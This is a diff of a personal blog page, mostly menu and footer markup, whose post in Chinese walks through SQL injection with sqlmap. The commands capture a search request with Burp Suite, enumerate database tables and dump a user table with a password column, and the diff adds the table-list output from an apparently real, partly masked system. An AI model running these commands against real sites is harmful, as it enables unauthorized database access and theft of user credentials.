@@ -7,7 +7,7 @@
 	<meta name="author" content="K">
 
 	
-	<meta name="description" content="主要通过sqlmap进行渗透 0x00 找到注入点 如图link 通过burpsuite获取此系统中某处的搜索功能 中的信息 然后保存到txt中 python sqlmap.py -r /Users/~/Desktop/injection6.txt 然后获取到注入点 link 0x02 &hellip;">
+	<meta name="description" content="主要通过sqlmap进行渗透 0x00 找到注入点 通过burpsuite获取此系统中某处的搜索功能 中的信息 然后保存到txt中 python sqlmap.py -r /Users/~/Desktop/injection6.txt 然后获取到注入点 0x02 查询数据库表 python &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -23,15 +23,180 @@
 
 <body>
 	<header id="header" class="inner"><h1><a href="/">K</a></h1>
-<nav id="main-nav"><ul class="main">
+<nav id="K_select">
+	<div class="alignleft menu">
+		<a class="button">Category</a>
+		<div class="container"><ul class="main">
+		
 	
+<li><a href="/blog/categories/markdown">markdown</a></li>
+
+<li><a href="/blog/categories/data">data</a></li>
+
+<li><a href="/blog/categories/php">php</a></li>
+
+<li><a href="/blog/categories/svn">svn</a></li>
+
+<li><a href="/blog/categories/octopress">octopress</a></li>
+
+<li><a href="/blog/categories/mysql">mysql</a></li>
+
+<li><a href="/blog/categories/j2ee">j2ee</a></li>
+
+<li><a href="/blog/categories/mac">mac</a></li>
+
+<li><a href="/blog/categories/struts2">struts2</a></li>
+
+<li><a href="/blog/categories/android">android</a></li>
+
+<li><a href="/blog/categories/hack">hack</a></li>
+
+<li><a href="/blog/categories/design">design</a></li>
+
+<li><a href="/blog/categories/eclipse">eclipse</a></li>
+
+<li><a href="/blog/categories/readme">readme</a></li>
+
+<li><a href="/blog/categories/javascript">javascript</a></li>
+
+<li><a href="/blog/categories/arduino">arduino</a></li>
+
+<li><a href="/blog/categories/jquery">jquery</a></li>
+
+<li><a href="/blog/categories/bootstrap">bootstrap</a></li>
+
+<li><a href="/blog/categories/squild">squild</a></li>
+
+<li><a href="/blog/categories/question">question</a></li>
+
+<li><a href="/blog/categories/java">java</a></li>
+
+<li><a href="/blog/categories/sqlmap">sqlmap</a></li>
+
+<li><a href="/blog/categories/python">python</a></li>
+
+<li><a href="/blog/categories/git">git</a></li>
+
+<li><a href="/blog/categories/pr">pr</a></li>
+
+<li><a href="/blog/categories/linux">linux</a></li>
+
+<li><a href="/blog/categories/oracle">oracle</a></li>
+
+<li><a href="/blog/categories/windows">windows</a></li>
+
+<li><a href="/blog/categories/video">video</a></li>
+
+<li><a href="/blog/categories/travel">travel</a></li>
+
+<li><a href="/blog/categories/web">web</a></li>
+
+<li><a href="/blog/categories/httracl">httracl</a></li>
+
+<li><a href="/blog/categories/httpclient">httpclient</a></li>
+
+<li><a href="/blog/categories/sql">sql</a></li>
+
+<li><a href="/blog/categories/photoshop">photoshop</a></li>
+
 </ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:mzkmzk.github.io">
+			</form>
+		</div>
+	</div>
 </nav>
+<nav id="main-nav">
+	<ul class="main">
+		
+	
+
+
+</ul>
+
+	</nav>
 <nav id="mobile-nav">
 	<div class="alignleft menu">
-		<a class="button">Menu</a>
+		<a class="button">Category</a>
 		<div class="container"><ul class="main">
+		
 	
+<li><a href="/blog/categories/markdown">markdown</a></li>
+
+<li><a href="/blog/categories/data">data</a></li>
+
+<li><a href="/blog/categories/php">php</a></li>
+
+<li><a href="/blog/categories/svn">svn</a></li>
+
+<li><a href="/blog/categories/octopress">octopress</a></li>
+
+<li><a href="/blog/categories/mysql">mysql</a></li>
+
+<li><a href="/blog/categories/j2ee">j2ee</a></li>
+
+<li><a href="/blog/categories/mac">mac</a></li>
+
+<li><a href="/blog/categories/struts2">struts2</a></li>
+
+<li><a href="/blog/categories/android">android</a></li>
+
+<li><a href="/blog/categories/hack">hack</a></li>
+
+<li><a href="/blog/categories/design">design</a></li>
+
+<li><a href="/blog/categories/eclipse">eclipse</a></li>
+
+<li><a href="/blog/categories/readme">readme</a></li>
+
+<li><a href="/blog/categories/javascript">javascript</a></li>
+
+<li><a href="/blog/categories/arduino">arduino</a></li>
+
+<li><a href="/blog/categories/jquery">jquery</a></li>
+
+<li><a href="/blog/categories/bootstrap">bootstrap</a></li>
+
+<li><a href="/blog/categories/squild">squild</a></li>
+
+<li><a href="/blog/categories/question">question</a></li>
+
+<li><a href="/blog/categories/java">java</a></li>
+
+<li><a href="/blog/categories/sqlmap">sqlmap</a></li>
+
+<li><a href="/blog/categories/python">python</a></li>
+
+<li><a href="/blog/categories/git">git</a></li>
+
+<li><a href="/blog/categories/pr">pr</a></li>
+
+<li><a href="/blog/categories/linux">linux</a></li>
+
+<li><a href="/blog/categories/oracle">oracle</a></li>
+
+<li><a href="/blog/categories/windows">windows</a></li>
+
+<li><a href="/blog/categories/video">video</a></li>
+
+<li><a href="/blog/categories/travel">travel</a></li>
+
+<li><a href="/blog/categories/web">web</a></li>
+
+<li><a href="/blog/categories/httracl">httracl</a></li>
+
+<li><a href="/blog/categories/httpclient">httpclient</a></li>
+
+<li><a href="/blog/categories/sql">sql</a></li>
+
+<li><a href="/blog/categories/photoshop">photoshop</a></li>
+
 </ul>
 </div>
 	</div>
@@ -75,8 +240,6 @@
 
 <h3>0x00 找到注入点</h3>
 
-<p>如图<a href="15-02-15-01">link</a></p>
-
 <p>通过<code>burpsuite</code>获取此系统中某处的搜索功能 中的信息 然后保存到txt中</p>
 
 <pre><code>python sqlmap.py -r /Users/~/Desktop/injection6.txt
@@ -84,19 +247,63 @@
 
 <p>然后获取到注入点</p>
 
-<p><a href="15-02-15-02">link</a></p>
+<p><img src="/images/blog/2015-06-01-01.png" alt="image" /></p>
 
 <h3>0x02 查询数据库表</h3>
 
 <pre><code>python sqlmap.py -r /Users/~/Desktop/injection6.txt  -p searchKeyword  --tables --exclude-sysdbs 
 </code></pre>
 
-<p><a href="15-02-15-03">link</a></p>
+<p><img src="/images/blog/2015-06-01-02.png" alt="image" /></p>
+
+<pre><code>+--------------------------+
+| eweb_info                |
+| eweb_info_atta           |
+| eweb_info_dict_category  |
+| eweb_info_dict_class     |
+| eweb_info_dict_system    |
+| eweb_info_oplog          |
+| eweb_info_privilege      |
+| eweb_sys_control_para    |
+| eweb_sys_group           |
+| eweb_sys_group_member    |
+| eweb_sys_log_visit       |
+| eweb_sys_operator        |
+| eweb_sys_privilege       |
+| eweb_sys_role            |
+| eweb_sys_user            |
+| oa_dict_schfile_category |
+| oa_dict_schfile_keycate  |
+| oa_dict_schfile_sendorg  |
+| oa_message               |
+| oa_message_atta          |
+| oa_message_oplog         |
+| oa_message_readlog       |
+| oa_schfile               |
+| oa_schfile_atta          |
+| oa_schfile_oplog         |
+| pbcatcol                 |
+| pbcatedt                 |
+| pbcatfmt                 |
+| pbcattbl                 |
+| pbcatvld                 |
++--------------------------+
+</code></pre>
 
 <h3>0x03 渗透步骤</h3>
 
-<p>这可以获取数据库和数据库表
-    python ~/Learning/Hack/sqlmap/sqlmap_new/sqlmap/sqlmap.py -r  ~/Desktop/hackTJRAC_BM.txt  -p tb_QueryText &ndash;tables &ndash;exclude-sysdbs &ndash;columns ,-C,-T,-D &ndash;dump -T vUsers</p>
+<p>这可以获取数据库表内容</p>
+
+<pre><code>python sqlmap.py -r ~/Project/****/perlPrint6.txt   --dump  -T ***_sys_user
+
+Database: app_manager
+Table: ****_sys_user
+[0 entries]
++---------+--------+-----------+------------+------------+
+| user_id | passwd | user_name | user_order | user_class |
++---------+--------+-----------+------------+------------+
++---------+--------+-----------+------------+------------+
+</code></pre>
 
 <h3>参考链接</h3>
 
@@ -143,9 +350,12 @@
 
 
 </div>
-	<footer id="footer" class="inner">Copyright &copy; 2015
+	<footer id="footer" class="inner">
+
+Copyright &copy; 2015
 
     K
+
 
 </footer>
 	<script src="/javascripts/slash.js"></script>
